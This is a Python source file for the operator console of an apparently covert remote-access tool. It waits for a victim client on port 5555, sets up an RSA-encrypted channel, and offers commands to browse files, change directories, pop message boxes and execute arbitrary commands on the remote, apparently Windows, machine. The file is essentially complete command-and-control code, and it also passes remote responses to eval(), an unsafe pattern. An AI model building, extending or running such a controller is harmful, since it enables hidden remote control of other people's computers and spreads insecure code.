from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
import socket

class color:
    BLACK = "\u001b[30m"
    RED = "\u001b[31m"
    GREEN = "\u001b[32m"
    YELLOW = "\u001b[33m"
    BLUE = "\u001b[34m"
    MAGENTA = "\u001b[35m"
    CYAN = "\u001b[36m"
    WHITE = "\u001b[37m"

def connSetup():
    server_socket = socket.socket(socket.AF_INET, 
                                  socket.SOCK_STREAM)   # Create Socket
    server_socket.bind(("0.0.0.0", 5555))   #Bind Socket
    server_socket.listen(1) # Listen for Connections
    print("Server is listening...") #Log Binding

    client_socket , client_address= server_socket.accept()  #Accept Connection
    print('Got connection from',client_address )    # Log Connection

    
    privateKey = rsa.generate_private_key(65537, 4096)  # Generate RSA Private Key
    publicKey = privateKey.public_key() # Generate RSA Public Key
    toSend = publicKey.public_bytes(encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo) # Format RSA Public Key
    client_socket.send(toSend)  # Send RSA Public Key

    
    key_bytes = client_socket.recv(8192)    # Recive Remote Public Key
    remoteKey = serialization.load_pem_public_key(key_bytes)    # Load Remote Public Key

    return client_socket, server_socket, privateKey, remoteKey

def crypt(message: bytes):
    ciphertext = remoteKey.encrypt( # type: ignore
        message,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        ))  # Encrypt message
    return ciphertext

def decrypt(message: bytes, encode='utf8'):
    mensaje_descifrado = privateKey.decrypt(
        message,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        ))  # Decrypt message
    return mensaje_descifrado.decode(encode)

client_socket, server_socket, privateKey, remoteKey = connSetup()   # Start Connection

change = 0
path = ""
# Main Code
while True:
    if change == 0:
        path = client_socket.recv(8192)
        path = decrypt(path)
    data = input(f"{color.BLUE}{path} >{color.WHITE} ")
    data = data.split(" ")
    command = data[0]

    if command == "ls":
        client_socket.send(crypt("ls".encode())) 
        response = client_socket.recv(8192)
        response = decrypt(response)
        response = eval(response)
        for i in range(0, len(response)): print(response[i])

    elif command == "pwd":
        client_socket.send(crypt("pwd".encode()))
        response = client_socket.recv(8192)
        response = decrypt(response)
        print(response)

    elif command == "cd":
        client_socket.send(crypt(str(data).encode()))

    elif command == "messagebox":
        client_socket.send(crypt(str(data).encode()))

    elif command == "execute":
        client_socket.send(crypt(str(data).encode()))
        count = client_socket.recv(8192)
        count = decrypt(count)
        try:
            count = int(count)
        except:
            print("An error Ocurred! 0x16")
        else:
            out = ""
            for i in range(count): 
                raw = client_socket.recv(8192)
                raw = decrypt(raw, encode='windows-1252')
                out = out + raw
                print(out)
            
    elif command == "help":
        print(f''' 
This is the help menu, there are 2 types of arguments: < Required > and [ Optional ].
The commands are divided by sections according to their function and each section is divided into 3 columns: 
command - description - context (if executed locally or remotely).
              
== {color.RED}SHELL{color.WHITE}
====================================================
ls                    List Files              Remote
pwd                   Print Path              Remote
cd <Path>             Change Directory        Remote
clear                 Clear Terminal          Local  
execute               Run remote commands     Remote \n''')
        change = 1

    elif command == "exit":
        print("Cleaning....")
        client_socket.send(crypt("sleep".encode()))
        break


server_socket.close()